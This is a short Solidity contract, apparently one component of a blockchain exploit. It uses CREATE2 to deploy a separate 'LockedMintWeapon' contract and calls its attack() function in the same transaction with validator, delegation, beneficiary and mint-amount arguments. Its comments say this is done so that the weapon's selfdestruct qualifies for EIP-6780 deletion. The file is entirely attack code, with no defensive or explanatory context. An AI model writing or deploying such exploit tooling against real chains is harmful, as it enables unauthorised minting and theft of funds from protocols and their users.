// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Deploys LockedMintWeapon via CREATE2 and calls attack() in the SAME tx, so the
// weapon's selfdestruct qualifies for EIP-6780 same-tx-creation deletion.
contract LockedMintDeployer {
    function run(
        bytes32 salt,
        bytes memory weaponInit,
        string calldata validatorAddr,
        uint256 delegateAmt,
        address payable beneficiary,
        uint256 mintAmt
    ) external {
        address weapon;
        assembly {
            weapon := create2(0, add(weaponInit, 0x20), mload(weaponInit), salt)
        }
        require(weapon != address(0), "create2 failed");
        (bool ok, ) = weapon.call(
            abi.encodeWithSignature(
                "attack(string,uint256,address,uint256)",
                validatorAddr,
                delegateAmt,
                beneficiary,
                mintAmt
            )
        );
        require(ok, "attack failed");
    }
}
